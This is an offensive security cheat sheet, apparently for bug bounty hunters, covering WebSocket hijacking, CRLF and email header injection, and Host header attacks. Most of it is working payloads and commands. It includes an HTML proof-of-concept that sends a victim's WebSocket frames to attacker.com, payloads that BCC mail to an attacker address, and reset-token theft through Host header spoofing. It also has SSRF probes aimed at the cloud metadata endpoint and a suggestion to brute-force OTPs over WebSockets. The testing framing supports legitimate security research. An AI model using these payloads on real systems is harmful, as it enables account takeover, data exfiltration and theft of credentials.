# WebSocket Attacks · CRLF Injection · Host Header Attacks

---

## §1 — WebSocket Attacks

### 1A — CSWSH (Cross-Site WebSocket Hijacking)

**Ceiling:** ATO-grade — victim's live session stream captured by attacker page.

**Mechanism:** WS handshake is an HTTP Upgrade request that carries cookies automatically. If the server authenticates by cookie without verifying `Origin`, any cross-origin page the victim visits can open a WS connection as the victim and read all frames the server sends.

**Find WS endpoints:**
```bash
# From JS recon — grep for:
new WebSocket(   EventSource(   wss://   /ws   /socket   /cable   /app   /hub   /graphql-ws
# Active discovery
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
  -mc 101,200 -H "Connection: Upgrade" -H "Upgrade: websocket"
```

**Detection:**
```bash
# Step 1 — intercept the normal upgrade request in Burp → WebSockets history
# Step 2 — resend with modified Origin (Burp Repeater)
# Variants to test — one per request:
Origin: https://evil.com
Origin: null
Origin: https://target.com.evil.com
Origin: https://subdomain.target.com
Origin: HTTPS://TARGET.COM
# No Origin header at all
# If server returns HTTP 101 Switching Protocols → vulnerable
```

**PoC HTML (hosted on attacker domain, victim visits):**
```html
<!DOCTYPE html><html><body>
<pre id="out"></pre>
<script>
const ws = new WebSocket('wss://TARGET.COM/ws');
ws.onopen = () => {
  ws.send(JSON.stringify({type:'subscribe', channel:'user_feed'}));
};
ws.onmessage = (e) => {
  document.getElementById('out').textContent += e.data + '\n';
  // exfil to attacker
  navigator.sendBeacon('https://attacker.com/collect', e.data);
};
</script>
</body></html>
```

**Verification:** Attacker server receives victim's real frames containing victim-specific data (messages, PII, session events). Screenshot of captured frames is PoC. A handshake upgrade without captured data = not confirmed.

**Origin bypass escalations:**
- `Origin: null` — browsers send `null` from sandboxed iframes; if server allows null, serve the PoC inside `<iframe sandbox="allow-scripts">`
- Subdomain trust (`*.target.com`) — combined with subdomain takeover or XSS on any subdomain = full CSWSH from same-site context
- CSRF token on WS handshake but no Origin check — Origin bypass still works; the CSRF token travels with the cross-origin request automatically

---

### 1B — WebSocket Message-Level Authorization (BOLA/BFLA per frame)

**Ceiling:** Foreign object data returned to low-priv/anon session. #1 paid WS class.

**Mechanism:** Authentication at connect ≠ authorization per frame. Server authenticates the connection owner via cookie/token, then trusts every subsequent frame's `room_id` / `order_id` / `user_id` / `tenant_id` without re-checking ownership.

**High-value targets:**
- Chat / messaging → foreign `room_id`
- Order/delivery status → foreign `order_id`
- Location streams → foreign `driver_id` / `user_id`
- Notification feeds → foreign `user_id`
- Financial / trade streams → foreign `account_id`
- Live dashboards → foreign `org_id` / `tenant_id`
- Admin event streams → connect as regular user, subscribe to admin channel

**Test (wscat):**
```bash
npm install -g wscat
# Connect as attacker
wscat -c wss://target.com/ws \
  -H "Cookie: session=ATTACKER_SESSION" \
  -H "Origin: https://target.com"

# After connected — send subscribe frames with VICTIM resource IDs:
{"type":"subscribe","channel":"notifications","user_id":"VICTIM_USER_ID"}
{"type":"join","room_id":"VICTIM_ROOM_ID"}
{"action":"watch","order_id":"VICTIM_ORDER_ID"}
{"subscribe":"presence","channel":"private-user.VICTIM_ID"}

# Also test unauthenticated — WS often skips HTTP middleware:
wscat -c wss://target.com/ws
{"type":"subscribe","feed":"orders","order_id":"ANY_ORDER_ID"}
```

**Rate-limit asymmetry bonus:** OTP / password-reset / expensive ops delivered via WS channel often have no rate limit (the REST twin is limited). Try brute-force OTP via WS message loop.

**Verification:** Incoming frames contain victim-specific data. Populate victim account with content in Phase 3 before testing. An empty "subscribed" acknowledgement without data = insufficient — wait for events or trigger them from victim account.

---

### 1C — WebSocket Infrastructure Gaps

**Token-in-query-string:**
```bash
# Identify: wss://target.com/ws?token=JWT or ?auth_token= or ?access_token=
# Capture in Burp → History → filter by WS Upgrade requests
# Replay from different IP / different User-Agent:
wscat -c "wss://target.com/ws?token=CAPTURED_TOKEN"
# If connects → token not bound to original session/IP → P2 at minimum
# Also: token visible in Referer headers from the page that opened the WS
```

**Socket.IO / engine.io polling fallback (WAF bypass + config leak):**
```bash
# Probe for Socket.IO
curl -si "https://target.com/socket.io/?EIO=4&transport=polling"
# Vulnerable response: {"sid":"...","upgrades":["websocket"],"pingInterval":25000,...}
# Significance:
# 1. Leaks internal session ID + config via a plain GET — may bypass WS-only WAF rules
# 2. Polling mode bypasses CSP ws:/wss: directives (plain XHR)
# 3. sid captured here can be used in subsequent polling requests:
curl "https://target.com/socket.io/?EIO=4&transport=polling&sid=CAPTURED_SID"
```

**graphql-ws auth gap:**
```bash
# graphql-ws protocol: ConnectionInit carries auth, Subscribe carries the query
# Test: send ConnectionInit with valid token, then send Subscribe with modified variables
# targeting another user's data — cross-ref graphql.md for BOLA patterns
```

**Pusher / Ably / Centrifuge channel auth bypass:**
```bash
# Private channels require a server-signed auth token per channel
# Test: can you subscribe to a private channel without triggering the auth endpoint?
# Or: is the channel-auth endpoint itself a BOLA (auth any channel_id you pass)?
curl -X POST https://target.com/pusher/auth \
  -d "channel_name=private-user.VICTIM_ID&socket_id=ATTACKER_SOCKET_ID"
# If returns auth token for victim's channel → BOLA on the auth endpoint
```

---

## §2 — CRLF Injection & HTTP Response Splitting

**Ceiling:** Header injection → session fixation (Set-Cookie), reflected XSS, cache poisoning, open redirect.

**Where to inject:**
Any param that lands in a response header:
- `redirect` / `return_url` / `next` / `continue` → Location header
- `lang` / `locale` / `timezone` → Set-Cookie or body
- `jsonp` / `callback` → Content-Type + body start
- `X-Request-ID` echo → any custom response header
- `format` / `type` → Content-Type header

**Payload set (try all encoding variants — WAF often blocks only the obvious one):**
```
# Classic
%0d%0a
%0a
%0d
# Unicode CRLF (U+560A U+560D — Chromium accepts)
%E5%98%8A%E5%98%8D
%E5%98%8A
# Overlong UTF-8
%c4%8d%c4%8a
# IIS unicode
%u000d%u000a
# Double-encode (WAF bypass)
%250d%250a
%25%30%64%25%30%61
```

**Attack 1 — Set-Cookie session fixation:**
```bash
curl -i "https://target.com/redirect?url=https://target.com%0d%0aSet-Cookie:%20session=FIXED_VALUE%3B%20Path%3D%2F%3B%20Secure"
# If response headers contain: Set-Cookie: session=FIXED_VALUE
# → attacker pre-sets cookie → victim visits crafted URL → logs in with known cookie
```

**Attack 2 — Location header open redirect chain:**
```bash
curl -i "https://target.com/redirect?url=https://target.com%0d%0aLocation:%20https://evil.com"
# If 3xx with injected Location → victim redirected to evil.com → phishing / token theft
```

**Attack 3 — Response splitting → reflected XSS:**
```bash
# Full response injection (requires server to emit Content-Length: 0 or no body)
PAYLOAD="%0d%0a%0d%0a<html><script>alert(document.cookie)</script></html>"
curl -i "https://target.com/page?lang=en${PAYLOAD}"
```

**Attack 4 — Cache poisoning via header injection:**
```bash
# Inject a header that affects caching behavior, poison for all users
curl -i "https://target.com/page?cb=%0d%0aX-Cache-Status:%20HIT" \
  -H "X-Forwarded-Host: target.com"
# Cross-ref cache-attacks.md for the unkeyed-header poisoning angle
```

**Verification:** `curl -i` or Burp shows the injected header present in raw HTTP response. DO NOT confirm from browser DevTools alone — browsers may normalize/strip injected headers. For Set-Cookie fixation: confirm the cookie appears in a second request without re-injecting.

---

## §2B — Email Header Injection (SMTP CRLF)

**Ceiling:** Password reset link delivered to attacker address → ATO (P1). BCC exfiltration of internal mails.

**Where:**
- Password reset ("email" or "to" field)
- Invite / share-by-email
- Contact / feedback forms
- Order confirmations / export-by-email
- "Email to a friend" features

**Payloads:**
```
# In the "to" / "from" / "subject" / "name" / "message" parameter:
victim@target.com%0aCC:attacker@evil.com
victim@target.com%0aBCC:attacker@evil.com
victim@target.com%0d%0aCC:attacker@evil.com
attacker@evil.com%0aTo:victim@target.com
Name%0d%0aCC:attacker@evil.com

# In JSON body (key finding from §13):
{"email": "victim@target.com\nCC: attacker@evil.com"}
{"email": "victim@target.com\r\nBCC: attacker@evil.com"}

# Subject injection:
Subject: Normal%0d%0aCC: attacker@evil.com

# From injection (sender spoofing):
From: legit@target.com%0d%0aFrom: attacker@evil.com
```

**Test procedure:**
1. Find any mail-sending endpoint (reset, invite, contact, export)
2. Inject payload into every field that could map to a mail header
3. Monitor attacker inbox — mail must actually arrive
4. For reset flows: check the token in the received reset email → attempt login

**Verification:** Mail arrives in attacker inbox. Screenshot of received email + token = full PoC. Error response from server alone does not confirm injection.

---

## §3 — Host Header Attacks

### 3A — Password Reset / Magic Link Token Theft

**Ceiling:** Reset token / magic link delivered with attacker-controlled domain → ATO (P1).

**Headers to inject (test each independently):**
```bash
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
Forwarded: host=attacker.com
X-Original-Host: attacker.com
X-Rewrite-URL: https://attacker.com
```

**Test procedure:**
```bash
# 1. Request password reset for victim@target.com
curl -si -X POST https://target.com/api/v1/password/reset \
  -H "Host: attacker.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com"}'

# Also try X-Forwarded-Host (many load balancers trust this):
curl -si -X POST https://target.com/api/v1/password/reset \
  -H "Host: target.com" \
  -H "X-Forwarded-Host: attacker.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com"}'

# 2. Check received email — does the reset link point to attacker.com?
# Use interactsh as the attacker domain to capture the token:
# interactsh-client -server interactsh.com -token YOUR_TOKEN
# Replace attacker.com with YOUR.oast.fun
```

**Flows to test beyond password reset:**
- Invite / team-join link generation
- Magic link / passwordless login
- OAuth `redirect_uri` generated server-side
- Webhook callback URL generation
- Email verification link
- Canonical URL / sitemap generation

**Confirmation:** Reset email arrives with `https://attacker.com/reset?token=...` in the link, OR interactsh receives the GET request with the token in the URL path/query.

### 3B — Virtual-Host Routing Bypass

```bash
# Probe internal vhosts via Host header manipulation:
curl -si https://target.com/ -H "Host: localhost"
curl -si https://target.com/ -H "Host: 127.0.0.1"
curl -si https://target.com/ -H "Host: admin.internal"
curl -si https://target.com/admin -H "Host: backend.target.com"
curl -si https://target.com/ -H "Host: dev.target.com"
# Also try internal service names: api-internal, dashboard, monitoring

# Port confusion (some reverse proxies strip the port, apps may match differently):
curl -si https://target.com/ -H "Host: target.com:80"
curl -si https://target.com/ -H "Host: target.com:443"
curl -si https://target.com/ -H "Host: target.com:8080"
```

**Confirmation:** Response body is different from normal — shows admin panel, internal dashboard, debug info, or application on a different port.

### 3C — Ambiguous Host Parsing

```bash
# Absolute-URI override (HTTP/1.0 proxy behaviour):
printf "GET https://target.com/admin HTTP/1.1\r\nHost: evil.com\r\n\r\n" | \
  openssl s_client -connect target.com:443 -quiet 2>/dev/null

# Multi-value / separator confusion:
curl -si https://target.com/ -H "Host: target.com:evil.com"
curl -si https://target.com/ -H $'Host: target.com\r\nHost: evil.com'
curl -si https://target.com/ -H "Host: evil.com#target.com"
curl -si https://target.com/ -H "Host: target.com."   # trailing dot (FQDN normalization)
```

### 3D — Host-Based SSRF in URL-Fetching Features

```bash
# When the app fetches a URL and uses the Host header as part of URL construction:
curl -si -X POST https://target.com/api/webhooks/test \
  -H "Host: 169.254.169.254" \
  -d '{"url":"/latest/meta-data/"}'

# Or via X-Forwarded-Host in the fetched URL:
curl -si -X POST https://target.com/preview \
  -H "X-Forwarded-Host: 169.254.169.254" \
  -d '{"url":"/render"}'
# Cross-ref ssrf.md for IMDS escalation paths
```

**False positive kill:** For token theft — email/link must arrive with attacker domain. For vhost bypass — response body must differ substantively from the normal response (not just a different status code). A 200 returning the normal homepage with a different Host = not a bypass.
